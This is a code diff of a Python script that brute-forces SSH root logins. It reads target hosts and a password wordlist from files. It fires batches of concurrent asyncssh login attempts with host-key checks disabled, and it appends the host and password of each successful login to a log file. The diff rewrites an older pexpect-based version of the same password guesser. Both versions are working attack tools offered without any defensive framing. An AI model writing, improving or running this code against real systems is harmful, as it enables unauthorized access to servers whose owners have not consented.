@@ -1,36 +1,38 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
+# coding: utf-8
 
-from pexpect import pxssh
-import asyncio
-
-user = 'root'
-port = 22
-
-with open('async_ip.txt', 'r') as f:
-    hosts = [h.strip() for h in f.readlines()]
-with open('pwd.txt', 'r') as f:
-    password_list = [p.strip() for p in f.readlines()]
+import asyncio, asyncssh, math
 
 
-async def test_password(password):
-    try:
-        s = pxssh.pxssh()
-        print("start test password: %s" % password)
-        await asyncio.sleep(0)
-        s.login(hosts[0], user, password, port=port)
-        print('-----------------------------password is %s---------------------------' % password)
-    except Exception as e:
-        print(e)
+async def run_client(host, password):
+    async with asyncssh.connect(host=host, port=22, username='root', password=password, known_hosts=None) as conn:
+        return await conn.run("echo '%s'" % password)
 
 
-async def test_host(password):
-    await test_password(password)
-    print("end test password: %s ..." % password)
+async def run_multiple_clients(host, passwords):
+    tasks = (run_client(host, password) for password in passwords)
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+
+    for i, result in enumerate(results, 1):
+        if isinstance(result, Exception):
+            print('Task %d failed: %s' % (i, str(result)))
+        elif result.exit_status != 0:
+            print('Task %d exited with status %s:' % (i, result.exit_status))
+            print(result.stderr, end='')
+        else:
+            print('Task %d succeeded:' + result.stdout)
+            with open('log.txt', 'a') as f:
+                f.write(host + ':' + result.stdout)
 
 
 if __name__ == '__main__':
+    base = 10
+    with open('pwd.txt', 'r') as f:
+        passwords = [password.strip() for password in f.readlines()]
+    with open('async_ip.txt', 'r') as f:
+        hosts = [host.strip() for host in f.readlines()]
+    count = math.ceil(len(passwords) / base)
     loop = asyncio.get_event_loop()
-    tasks = [test_host(password) for password in password_list]
-    loop.run_until_complete(asyncio.wait(tasks))
+    for host in hosts:
+        for time in range(int(count)):
+            loop.run_until_complete(run_multiple_clients(host, passwords[time * base: time * base + base]))
     loop.close()
